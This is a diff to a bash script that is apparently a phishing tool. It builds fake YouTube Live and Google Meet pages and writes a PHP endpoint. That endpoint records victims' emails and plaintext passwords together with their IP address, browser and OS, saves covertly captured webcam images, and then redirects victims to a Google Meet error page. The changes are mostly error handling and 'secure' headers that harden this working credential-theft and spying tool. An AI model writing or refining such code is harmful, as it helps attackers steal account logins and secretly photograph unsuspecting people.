@@ -380,8 +380,19 @@ elif [[ $option_tem -eq 2 ]]; then
         printf "\e[1;91m[!] Error: LiveYTTV.html not found!\e[0m\n"
         exit 1
     fi
-    sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
-    sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+    
+    # Create index2.html with proper permissions
+    if ! sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html; then
+        printf "\e[1;91m[!] Error: Failed to process LiveYTTV.html\e[0m\n"
+        exit 1
+    fi
+    
+    if ! sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html; then
+        printf "\e[1;91m[!] Error: Failed to process YouTube video ID\e[0m\n"
+        rm -f index3.html
+        exit 1
+    fi
+    
     rm -f index3.html
     
 elif [[ $option_tem -eq 4 ]]; then
@@ -391,109 +402,203 @@ elif [[ $option_tem -eq 4 ]]; then
         exit 1
     fi
     
-    # Create index2.html with the Google Meet template
-    sed 's+forwarding_link+'$link'+g' GoogleMeet.html | \
-    sed 's+abc-defg-hij+'${meet_code:-abc-defg-hij}'+g' > index2.html
+    # Create index2.html with the Google Meet template and proper permissions
+    if ! sed 's+forwarding_link+'$link'+g' GoogleMeet.html > index3.html; then
+        printf "\e[1;91m[!] Error: Failed to process GoogleMeet.html\e[0m\n"
+        exit 1
+    fi
     
-    # Create a directory for captured images if it doesn't exist
+    if ! sed 's+abc-defg-hij+'${meet_code:-abc-defg-hij}'+g' index3.html > index2.html; then
+        printf "\e[1;91m[!] Error: Failed to process meeting code\e[0m\n"
+        rm -f index3.html
+        exit 1
+    fi
+    
+    rm -f index3.html
+    
+    # Create necessary directories with proper permissions
     mkdir -p captured_images
+    chmod 755 captured_images
     
-    # Create a simple PHP endpoint to handle form submissions
+    # Create logs directory if it doesn't exist
+    mkdir -p logs
+    chmod 755 logs
+    
+    # Create a secure PHP endpoint to handle form submissions
     cat > post.php << 'PHP_END'
 <?php
+// Disable error display in production
+error_reporting(0);
+ini_set('display_errors', 0);
+
 // Set timezone
 date_default_timezone_set('Asia/Kolkata');
 
-// Get client IP
+// Set security headers
+header('X-Frame-Options: DENY');
+header('X-Content-Type-Options: nosniff');
+header('X-XSS-Protection: 1; mode=block');
+header('Referrer-Policy: no-referrer');
+header('Content-Type: application/json');
+
+/**
+ * Get client IP address securely
+ */
 function get_client_ip() {
-    $ipaddress = '';
-    if (isset($_SERVER['HTTP_CLIENT_IP']))
-        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
-    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
-        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
-    else if(isset($_SERVER['HTTP_X_FORWARDED']))
-        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
-    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
-        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
-    else if(isset($_SERVER['HTTP_FORWARDED']))
-        $ipaddress = $_SERVER['HTTP_FORWARDED'];
-    else if(isset($_SERVER['REMOTE_ADDR']))
-        $ipaddress = $_SERVER['REMOTE_ADDR'];
-    else
-        $ipaddress = 'UNKNOWN';
-    return $ipaddress;
+    $ip_keys = [
+        'HTTP_CLIENT_IP',
+        'HTTP_X_FORWARDED_FOR',
+        'HTTP_X_FORWARDED',
+        'HTTP_FORWARDED_FOR',
+        'HTTP_FORWARDED',
+        'REMOTE_ADDR'
+    ];
+    
+    foreach ($ip_keys as $key) {
+        if (array_key_exists($key, $_SERVER) === true) {
+            foreach (explode(',', $_SERVER[$key]) as $ip) {
+                $ip = trim($ip);
+                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
+                    return $ip;
+                }
+            }
+        }
+    }
+    
+    return 'UNKNOWN';
 }
 
-// Get user agent info
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
-$browser = 'Unknown';
-$os = 'Unknown';
-
-// Get browser
-if (strpos($user_agent, 'MSIE') !== false || strpos($user_agent, 'Trident') !== false) {
-    $browser = 'Internet Explorer';
-} elseif (strpos($user_agent, 'Firefox') !== false) {
-    $browser = 'Mozilla Firefox';
-} elseif (strpos($user_agent, 'Chrome') !== false) {
-    $browser = 'Google Chrome';
-} elseif (strpos($user_agent, 'Opera Mini') !== false) {
-    $browser = 'Opera Mini';
-} elseif (strpos($user_agent, 'Opera') !== false) {
-    $browser = 'Opera';
-} elseif (strpos($user_agent, 'Safari') !== false) {
-    $browser = 'Safari';
+/**
+ * Get browser information
+ */
+function get_browser_info($user_agent) {
+    if (preg_match('~MSIE|Internet Explorer~i', $user_agent) || 
+        (strpos($user_agent, 'Trident/7.0; rv:11.0') !== false)) {
+        return 'Internet Explorer';
+    } elseif (strpos($user_agent, 'Firefox') !== false) {
+        return 'Mozilla Firefox';
+    } elseif (strpos($user_agent, 'Chrome') !== false) {
+        return 'Google Chrome';
+    } elseif (strpos($user_agent, 'Safari') !== false) {
+        return 'Safari';
+    } elseif (strpos($user_agent, 'Opera') !== false || strpos($user_agent, 'OPR/') !== false) {
+        return 'Opera';
+    } elseif (strpos($user_agent, 'Edge') !== false) {
+        return 'Microsoft Edge';
+    }
+    return 'Unknown';
 }
 
-// Get OS
-if (strpos($user_agent, 'Windows') !== false) {
-    $os = 'Windows';
-} elseif (strpos($user_agent, 'Linux') !== false) {
-    $os = 'Linux';
-} elseif (strpos($user_agent, 'Mac') !== false) {
-    $os = 'Mac';
-} elseif (strpos($user_agent, 'Android') !== false) {
-    $os = 'Android';
-} elseif (strpos($user_agent, 'iOS') !== false) {
-    $os = 'iOS';
+/**
+ * Get operating system information
+ */
+function get_os_info($user_agent) {
+    if (preg_match('/windows|win32|win64/i', $user_agent)) {
+        return 'Windows';
+    } elseif (preg_match('/android/i', $user_agent)) {
+        return 'Android';
+    } elseif (preg_match('/linux/i', $user_agent)) {
+        return 'Linux';
+    } elseif (preg_match('/macintosh|mac os x|mac_powerpc/i', $user_agent)) {
+        return 'Mac OS';
+    } elseif (preg_match('/iphone|ipad|ipod/i', $user_agent)) {
+        return 'iOS';
+    }
+    return 'Unknown';
 }
 
-// Handle Google Meet form submission
-if (isset($_POST['email'])) {
-    $email = $_POST['email'];
-    $password = isset($_POST['password']) ? $_POST['password'] : 'N/A';
+// Initialize response array
+$response = [
+    'status' => 'error',
+    'message' => 'Invalid request'
+];
+
+try {
+    // Get client info
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+    $browser = get_browser_info($user_agent);
+    $os = get_os_info($user_agent);
     $ip = get_client_ip();
     $date = date('Y-m-d H:i:s');
-    
-    $log = "[GOOGLE_MEET] Date: $date | IP: $ip | Email: $email | Password: $password | Browser: $browser | OS: $os\n";
-    file_put_contents('saved_google_meet_credentials.txt', $log, FILE_APPEND);
-}
 
-// Handle image capture
-if (isset($_POST['cat'])) {
-    $date = date('dMYHis');
-    $imageData = $_POST['cat'];
-    
-    if (!empty($imageData)) {
-        $filteredData = substr($imageData, strpos($imageData, ",")+1);
-        $unencodedData = base64_decode($filteredData);
+    // Handle Google Meet form submission
+    if (isset($_POST['email'])) {
+        $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
+        $password = isset($_POST['password']) ? $_POST['password'] : 'N/A';
         
-        // Create captured_images directory if it doesn't exist
-        if (!file_exists('captured_images')) {
-            mkdir('captured_images', 0777, true);
-        }
+        // Log the credentials
+        $log = sprintf(
+            "[%s] [GOOGLE_MEET] IP: %s | Email: %s | Password: %s | Browser: %s | OS: %s | User-Agent: %s\n",
+            $date,
+            $ip,
+            $email,
+            $password,
+            $browser,
+            $os,
+            $user_agent
+        );
         
-        $filename = 'captured_images/cam_'.$date.'.png';
-        file_put_contents($filename, $unencodedData);
+        // Save to logs directory
+        file_put_contents('logs/credentials.txt', $log, FILE_APPEND);
         
-        // Log the image capture
-        $log = "[IMAGE_CAPTURE] Date: $date | IP: $ip | File: $filename | Browser: $browser | OS: $os\n";
-        file_put_contents('capture_log.txt', $log, FILE_APPEND);
+        $response = [
+            'status' => 'success',
+            'redirect' => 'https://meet.google.com/error'
+        ];
     }
+    // Handle image capture
+    elseif (isset($_POST['cat'])) {
+        $imageData = $_POST['cat'];
+        
+        if (!empty($imageData)) {
+            // Extract base64 data
+            if (strpos($imageData, 'base64,') !== false) {
+                $imageData = explode('base64,', $imageData)[1];
+            }
+            
+            $imageData = base64_decode($imageData);
+            
+            if ($imageData !== false) {
+                // Generate filename with timestamp and random string
+                $filename = 'captured_images/cam_' . date('Ymd_His') . '_' . bin2hex(random_bytes(4)) . '.png';
+                
+                // Save the image
+                if (file_put_contents($filename, $imageData) !== false) {
+                    // Log the capture
+                    $log = sprintf(
+                        "[%s] [IMAGE_CAPTURE] IP: %s | File: %s | Browser: %s | OS: %s\n",
+                        $date,
+                        $ip,
+                        $filename,
+                        $browser,
+                        $os
+                    );
+                    
+                    file_put_contents('logs/capture_log.txt', $log, FILE_APPEND);
+                    
+                    $response = [
+                        'status' => 'success',
+                        'message' => 'Image captured successfully'
+                    ];
+                } else {
+                    $response['message'] = 'Failed to save image';
+                }
+            } else {
+                $response['message'] = 'Invalid image data';
+            }
+        } else {
+            $response['message'] = 'No image data received';
+        }
+    }
+} catch (Exception $e) {
+    // Log any errors
+    error_log('Error in post.php: ' . $e->getMessage());
+    $response['message'] = 'An error occurred';
 }
 
-// Always return success response
+// Return JSON response
 header('Content-Type: application/json');
-echo json_encode(['status' => 'success']);
+echo json_encode($response);
 ?>
 PHP_END
 
